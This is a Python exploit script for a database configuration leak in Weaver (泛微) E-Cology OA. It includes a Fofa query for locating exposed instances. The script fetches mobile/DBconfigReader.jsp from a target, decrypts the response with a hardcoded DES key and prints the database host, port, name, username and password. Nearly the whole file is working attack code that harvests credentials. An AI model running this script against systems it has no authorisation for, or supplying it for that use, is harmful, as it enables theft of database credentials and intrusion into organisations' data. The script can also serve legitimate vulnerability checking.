# -*- coding: utf-8 -*-
# 泛微OA E-Cology 数据库配置信息泄漏
# Fofa:  app="泛微-协同办公OA"

import pyDes
import requests
import sys
import time

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC


def info():
    return VIOLET + "[INFO] " + ENDC


def error():
    return RED + "[ERROR] " + ENDC


def success():
    return GREEN + "[SUCCESS] " + ENDC


def warning():
    return YELLOW + "[WARNING] " + ENDC


headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'
}


def desdecode(secret_key, s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y


def checkVulUrl(url):
    url += 'mobile/DBconfigReader.jsp'
    try:
        requests.packages.urllib3.disable_warnings()
        res = requests.get(url=url, headers=headers, timeout=10, verify=False)
        if res.status_code != 200:
            print(now_time() + warning() + '不存在泛微OA E-Cology 数据库配置信息泄漏漏洞')
        elif res.status_code == 200:
            print(now_time() + info() + '可能存在泛微OA E-Cology 数据库配置信息泄漏漏洞')
            res = res.content
            try:
                data = desdecode('1z2x3c4v5b6n', res.strip())
                data = data.strip()
                dbType = str(data).split(';')[0].split(':')[1]
                dbUrl = str(data).split(';')[0].split(':')[2].split('//')[1]
                dbPort = str(data).split(';')[0].split(':')[3]
                dbName = str(data).split(';')[1].split(',')[0].split('=')[1]
                dbUser = str(data).split(';')[1].split(',')[1].split('=')[1]
                dbPass = str(data).split(';')[1].split(',')[2].split('=')[1]
                print(now_time() + success() + url +
                      "\n    DBType: {0}\n    DBUrl: {1}\n    DBPort: {2}\n    DBName: {3}\n    DBUser: {4}\n    DBPass: {5}".format(
                          dbType, dbUrl, dbPort, dbName, dbUser, dbPass))
                return 'ok'
            except:
                print(now_time() + warning() + 'DES解密失败, 可能默认密钥错误, 手动访问进行确认: {}'.format(url))
    except:
        print(now_time() + error() + '无法连接到目标')


if __name__ == '__main__':
    url = sys.argv[1]
    if url[-1] != '/':
        url += '/'
    checkVulUrl(url)
